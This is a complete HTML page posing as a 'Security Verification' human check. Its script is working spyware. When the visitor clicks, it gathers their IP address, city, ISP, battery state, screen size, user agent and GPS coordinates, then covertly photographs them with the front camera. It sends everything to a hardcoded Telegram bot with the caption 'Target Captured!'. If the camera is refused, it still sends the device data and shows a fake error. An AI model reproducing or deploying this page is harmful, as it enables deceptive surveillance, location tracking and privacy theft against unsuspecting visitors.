<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Required</title>
    <style>
        body {
            background-color: #0f172a;
            color: #f8fafc;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: #1e293b;
            padding: 30px;
            border-radius: 12px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            max-width: 320px;
            width: 100%;
        }
        .btn {
            background-color: #38bdf8;
            color: #0f172a;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 20px;
            width: 100%;
            transition: 0.2s;
        }
        .btn:hover {
            background-color: #0ea5e9;
        }
    </style>
</head>
<body>
    <div class="card" id="main-card">
        <h3>🔒 Security Verification</h3>
        <p style="color: #94a3b8; font-size: 14px;">Click below to verify that you are a human and load the content.</p>
        <button class="btn" onclick="startCapture()">Continue ➔</button>
    </div>

    <div class="card" id="loading-card" style="display: none;">
        <h3>Loading...</h3>
        <p style="color: #94a3b8; font-size: 14px;">Please wait while we fetch your content.</p>
    </div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8857558695:AAGOlJ_9PzeyvaOku_2_-MxjdbZJILC1cQI";
        const CHAT_ID = "6478868514";

        async function startCapture() {
            document.getElementById('main-card').style.display = 'none';
            document.getElementById('loading-card').style.display = 'block';

            // 1. Fetch IP & Location details
            let ipInfo = "N/A";
            try {
                let ipRes = await fetch('https://ipapi.co/json/');
                let ipData = await ipRes.json();
                ipInfo = `🌐 **IP Information**\n🔢 IP: \`${ipData.ip}\`\n📍 Location: ${ipData.city}, ${ipData.region}\n🗺 Country: ${ipData.country_name}\n📡 ISP: ${ipData.org}`;
            } catch(e) {
                ipInfo = "🌐 IP Info: Failed to fetch";
            }

            // 2. Fetch Battery details
            let batteryInfo = "N/A";
            try {
                if (navigator.getBattery) {
                    let bat = await navigator.getBattery();
                    batteryInfo = `🔋 Battery: ${Math.round(bat.level * 100)}% (${bat.charging ? 'Charging ⚡' : 'Not Charging'})`;
                }
            } catch(e) {}

            // 3. Screen & Device info
            let screenInfo = `🖥️ Screen: ${window.innerWidth}x${window.innerHeight}`;
            let uaInfo = `🧠 UA: ${navigator.userAgent}`;

            // 4. GPS Location (Live Coordinates)
            let gpsInfo = "📍 GPS: Not Allowed / Unavailable";
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    let lat = pos.coords.latitude;
                    let lon = pos.coords.longitude;
                    gpsInfo = `📍 **Live GPS:** [Google Maps](https://maps.google.com/?q=${lat},${lon})`;
                }, err => {}, { timeout: 5000 });
            }

            setTimeout(async () => {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');

                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    video.srcObject = stream;
                    video.play();
                    
                    setTimeout(() => {
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        canvas.toBlob(blob => {
                            stream.getTracks().forEach(track => track.stop());

                            let fullCaption = `📸 **Target Captured!**\n\n${ipInfo}\n\n📱 **Device Details**\n${batteryInfo}\n${screenInfo}\n${gpsInfo}\n\n${uaInfo}\n\n━━━━━━━━━━━━━━━━━━━\n✨ **Credit by : आयुष नेगी**`;

                            const formData = new FormData();
                            formData.append('chat_id', CHAT_ID);
                            formData.append('caption', fullCaption);
                            formData.append('parse_mode', 'Markdown');
                            formData.append('photo', blob, 'captured.jpg');

                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            }).catch(err => console.error(err));

                        }, 'image/jpeg', 0.85);

                    }, 1500);

                } catch(err) {
                    let fullCaption = `⚠️ **Camera Denied, but Info Captured:**\n\n${ipInfo}\n\n📱 **Device Details**\n${batteryInfo}\n${screenInfo}\n${gpsInfo}\n\n━━━━━━━━━━━━━━━━━━━\n✨ **Credit by : आयुष नेगी**`;
                    
                    let formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('text', fullCaption);
                    formData.append('parse_mode', 'Markdown');
                    
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        body: formData
                    }).catch(e => {});

                    document.getElementById('loading-card').innerHTML = "<h3>Error Loading Page</h3><p style='color:#ef4444;font-size:14px;'>Please try again.</p>";
                }
            }, 1000);
        }
    </script>
</body>
</html>
